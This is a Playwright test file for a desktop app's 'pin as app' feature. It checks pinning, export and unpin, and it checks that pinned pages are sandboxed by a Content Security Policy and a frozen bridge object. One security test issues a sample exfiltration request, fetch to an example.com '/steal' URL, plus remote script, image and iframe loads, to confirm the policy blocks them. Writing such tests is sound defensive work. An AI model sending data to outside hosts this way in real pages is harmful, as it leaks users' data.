// Flow 5: pin an artifact draft as an app and see it listed. The native pinned window can't
// be driven by Playwright, so the pinned page is tested on its own: served with the
// PINNED_APP_CSP header and given the same initialization script the shell injects.
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { PINNED_APP_CSP } from "../../../packages/contracts/src/artifact.ts";
import { addKey, expect, output, runTask, test } from "./fixtures";

const initScript = readFileSync(fileURLToPath(new URL("../src-tauri/src/pinned_init.js", import.meta.url)), "utf8");

/** Stands in for Tauri's IPC: records invoke calls, answers bridge_run like the shell would. */
const fakeTauriIpc = `
  window.__ipcCalls = [];
  window.__TAURI_INTERNALS__ = {
    invoke(cmd, args) {
      window.__ipcCalls.push({ cmd, args });
      return Promise.resolve({ ok: true, text: "3 overdue invoices", data: { count: 3 } });
    },
  };
`;

test("pin a draft from a run, see it under Apps, open, export, unpin", async ({ page }) => {
  await addKey(page);
  await runTask(page, "Make me an invoice tracker app");
  const draft = output(page).locator('[data-draft="invoice-tracker"]');
  await expect(draft).toContainText("Invoice tracker");
  await expect(draft).toContainText("Can run: invoice-chaser");
  await draft.getByRole("button", { name: "Pin as app" }).click();
  await expect(draft).toContainText("Pinned. Find it under Apps.");

  await page.getByRole("link", { name: "Apps" }).click();
  const pinned = page.getByRole("region", { name: "Pinned apps" });
  const card = pinned.locator('[data-app="invoice-tracker"]');
  await expect(card).toBeVisible();
  await expect(card).toContainText("Invoice tracker");
  await expect(card).toContainText("v1.0.0");
  await expect(card).toContainText("Can run: invoice-chaser · 640×520");
  // The draft is no longer offered once pinned.
  await expect(page.getByRole("region", { name: "Drafts from your runs" })).toBeHidden();

  // Open: in browser mode the bridge answers with the page URL and the UI opens a tab.
  const [popup] = await Promise.all([page.waitForEvent("popup"), card.getByRole("button", { name: "Open" }).click()]);
  await popup.waitForLoadState();
  expect(new URL(popup.url()).pathname).toBe("/pinned/invoice-tracker/");
  await expect(popup.getByRole("heading", { name: "Invoice tracker" })).toBeVisible();
  await popup.close();

  // Export: files are copied and the build command is shown.
  await card.getByRole("button", { name: "Export" }).click();
  await expect(pinned).toContainText("export-app -- --app");
  await expect(pinned).toContainText("exports/invoice-tracker");

  // Unpin with confirmation.
  await card.getByRole("button", { name: "Unpin", exact: true }).click();
  await card.getByRole("button", { name: "Unpin Invoice tracker" }).click();
  await expect(pinned.locator('[data-app="invoice-tracker"]')).toHaveCount(0);
  await expect(pinned).toContainText("No pinned apps yet.");
});

test("the pinned page gets the CSP and only the oneseat.run bridge", async ({ page, browser, request }) => {
  // Pin the fake daemon's artifact through the UI, so it is stored where the shell serves it.
  await addKey(page);
  await runTask(page, "Build an invoice tracker app");
  await output(page).getByRole("button", { name: "Pin as app" }).click();
  await expect(output(page)).toContainText("Pinned.");

  // The response carries exactly the contracts CSP.
  const res = await request.get("/pinned/invoice-tracker/");
  expect(res.status()).toBe(200);
  expect(res.headers()["content-security-policy"]).toBe(PINNED_APP_CSP);

  const ctx = await browser.newContext();
  const app = await ctx.newPage();
  await app.addInitScript(fakeTauriIpc);
  await app.addInitScript(initScript);
  const violations: string[] = [];
  app.on("console", (m) => {
    if (/Content Security Policy/i.test(m.text())) violations.push(m.text());
  });
  await app.goto("/pinned/invoice-tracker/");
  await expect(app.getByRole("heading", { name: "Invoice tracker" })).toBeVisible();

  // The bridge surface: one frozen object with one method.
  const surface = await app.evaluate(() => {
    const w = window as unknown as { oneseat: Record<string, unknown> };
    const desc = Object.getOwnPropertyDescriptor(window, "oneseat");
    let replaced = false;
    try {
      (window as unknown as { oneseat: unknown }).oneseat = { run: () => "evil" };
      replaced = (window as unknown as { oneseat: { run: () => unknown } }).oneseat.run() === "evil";
    } catch {
      replaced = false;
    }
    return {
      keys: Object.keys(w.oneseat),
      runType: typeof w.oneseat["run"],
      frozen: Object.isFrozen(w.oneseat),
      writable: desc?.writable,
      configurable: desc?.configurable,
      replaced,
    };
  });
  expect(surface).toEqual({ keys: ["run"], runType: "function", frozen: true, writable: false, configurable: false, replaced: false });

  // oneseat.run sends exactly one command, bridge_run, with only skill and input (no app id).
  await app.getByRole("button", { name: "Check overdue invoices" }).click();
  await expect(app.locator("#out")).toHaveText(/3 overdue invoices/);
  const calls = await app.evaluate(() => (window as unknown as { __ipcCalls: unknown[] }).__ipcCalls);
  expect(calls).toEqual([{ cmd: "bridge_run", args: { skill: "invoice-chaser", input: { action: "list-overdue" } } }]);
  // Bad input is refused before it reaches the shell.
  const bad = await app.evaluate(async () => {
    const run = (window as unknown as { oneseat: { run: (s: unknown, i: unknown) => Promise<unknown> } }).oneseat.run;
    const out: string[] = [];
    for (const [s, i] of [["Not A Skill", "x"], ["ok", [1]], ["ok", null]] as const) {
      try {
        await run(s, i);
        out.push("resolved");
      } catch (e) {
        out.push((e as Error).name);
      }
    }
    return out;
  });
  expect(bad).toEqual(["TypeError", "TypeError", "TypeError"]);

  // Network is blocked by the CSP: fetch to a remote host never leaves the page.
  const fetchResult = await app.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(`${e.violatedDirective} ${e.blockedURI}`));
    let outcome = "resolved";
    try {
      await fetch("https://example.com/steal?data=1");
    } catch (e) {
      outcome = (e as Error).name;
    }
    await new Promise((r) => setTimeout(r, 100));
    return { outcome, seen };
  });
  expect(fetchResult.outcome).toBe("TypeError");
  expect(fetchResult.seen.some((s) => s.startsWith("connect-src") && s.includes("example.com"))).toBe(true);

  // Remote scripts, images and frames are blocked too.
  const others = await app.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.effectiveDirective));
    const img = document.createElement("img");
    img.src = "https://example.com/pixel.png";
    document.body.appendChild(img);
    const s = document.createElement("script");
    s.src = "https://example.com/x.js";
    document.body.appendChild(s);
    const f = document.createElement("iframe");
    f.src = "https://example.com/";
    document.body.appendChild(f);
    await new Promise((r) => setTimeout(r, 300));
    return seen;
  });
  expect(others).toEqual(expect.arrayContaining(["img-src", "script-src-elem", "frame-src"]));
  expect(violations.length).toBeGreaterThan(0);
  await ctx.close();
});

test("the init script adds only window.oneseat", async ({ browser }) => {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto("about:blank");
  const added = await page.evaluate((script) => {
    const before = new Set(Object.getOwnPropertyNames(window));
    new Function(script)();
    return Object.getOwnPropertyNames(window).filter((k) => !before.has(k));
  }, initScript);
  expect(added).toEqual(["oneseat"]);
  // Without the shell's IPC, run rejects instead of reaching anything else.
  const err = await page.evaluate(() => (window as unknown as { oneseat: { run: (s: string, i: string) => Promise<unknown> } }).oneseat.run("a", "b").catch((e: Error) => e.message));
  expect(err).toContain("bridge is not available");
  await ctx.close();
});
